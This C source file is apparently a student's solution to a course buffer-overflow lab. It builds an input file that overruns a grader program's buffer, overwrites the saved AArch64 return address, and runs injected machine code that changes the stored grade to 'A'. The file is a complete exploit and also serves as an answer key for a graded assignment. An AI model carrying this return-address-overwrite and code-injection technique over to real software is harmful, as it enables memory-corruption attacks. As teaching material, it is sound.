/*
 * createdataA.c  —  final “print-name + change-grade” exploit
 *
 * Build-and-run sequence (same as before):
 *    $ gcc -Wall -Wextra -O2 createdataA.c miniassembler.c -o createdataA
 *    $ ./createdataA          # emits binary file dataA
 *    $ ./grader < dataA       # grader prints “A” and thanks us by name
 *
 * What the program writes to dataA   (each row is 4 bytes = one AArch64 word):
 * ---------------------------------------------------------------------------
 *  0x420058   “Ben Zhou and Owen Clarke\0”    ← printable name (25 bytes)
 *  …          3×0x00 padding for 4-byte align
 *  0x420074   STUB  (48 bytes, 12 words)
 *  0x4200A4   0x0000000000420074            ← overwritten saved x30 (RET)
 * ---------------------------------------------------------------------------
 *
 *  ▸ The string is what the grader’s final printf() will read.
 *  ▸ The stub at 0x420074 executes *after the overflow*; it
 *      (1) stores ‘A’ into the global grade variable and
 *      (2) branches to the grader’s built-in print-grade routine.
 *
 *  All machine words are generated with the helper functions in miniassembler.c,
 *  so we never hand-encode any opcodes.
 */

#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

/*----------------------------- CONSTANTS -----------------------------*/
/* These absolute addresses come from the grader’s public .map file.   */
enum {
    NAME_ADDR   = 0x420058UL,   /* start of name[ ] BSS array (RWX)   */
    GRADE_ADDR  = 0x420044UL,   /* &grade (‘D’ → to be patched to ‘A’) */
    PRINT_ADDR  = 0x40089cUL    /* grader’s “print-grade” subroutine  */
};

/*--------------------------- MAIN PROGRAM ---------------------------*/
int main(void)
{
    /*----------------------------------------------------------*/
    /* 0.  Open output file in binary mode                      */
    /*----------------------------------------------------------*/
    FILE *f = fopen("dataA", "wb");
    if (!f) {
        perror("dataA");
        return 1;
    }

    /*----------------------------------------------------------*/
    /* 1.  Emit the *printable* name that the grader will echo  */
    /*----------------------------------------------------------*/
    const char *myName   = "Ben Zhou and Owen Clarke";
    size_t      nName    = strlen(myName) + 1;            /* +1 for NUL */
    fwrite(myName, 1, nName, f);

    /* Pad with extra NULs so the next item (stub) begins on a
       4-byte boundary.  The ARM assembler requires word alignment.  */
    size_t pad = (4 - (nName & 3)) & 3;   /* 0‥3 bytes needed */
    for (size_t i = 0; i < pad; ++i)
        fputc('\0', f);

    /*----------------------------------------------------------*/
    /* 2.  Assemble and emit the 48-byte stub                   */
    /*----------------------------------------------------------*/
    /* The stub’s *runtime* address: NAME_ADDR + nName + pad.   */
    const unsigned long STUB_ADDR = NAME_ADDR + nName + pad;

    unsigned long pc     = STUB_ADDR;   /* “program counter” while assembling */
    unsigned int  instr;                /* temp for each 32-bit opcode       */

    /* 2a.  ADR  x0, &grade           (x0 ← pointer to global grade) */
    instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2b.  MOV  w1, #'A'            (w1 ← ASCII 'A')               */
    instr = MiniAssembler_mov(1, 'A');
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2c.  STRB w1, [x0]            (*grade = 'A')                 */
    instr = MiniAssembler_strb(1, 0);   /* from w1, to x0           */
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2d.  B    PRINT_ADDR          (jump to grader’s print code) */
    instr = MiniAssembler_b(PRINT_ADDR, pc);
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2e.  Pad stub to full 48 bytes with “mov w0,#0” (acts as NOP) */
    while (pc < STUB_ADDR + 48) {
        instr = MiniAssembler_mov(0, 0);
        fwrite(&instr, 4, 1, f);
        pc += 4;
    }

    /*----------------------------------------------------------*/
    /* 3.  Smash readString’s saved return address (x30).       */
    /*     When readString finishes and executes `ret`,         */
    /*     control flows straight into our stub at STUB_ADDR.   */
    /*----------------------------------------------------------*/
    fwrite(&STUB_ADDR, sizeof(STUB_ADDR), 1, f);

    /*------------------------- DONE ---------------------------*/
    fclose(f);
    return 0;
}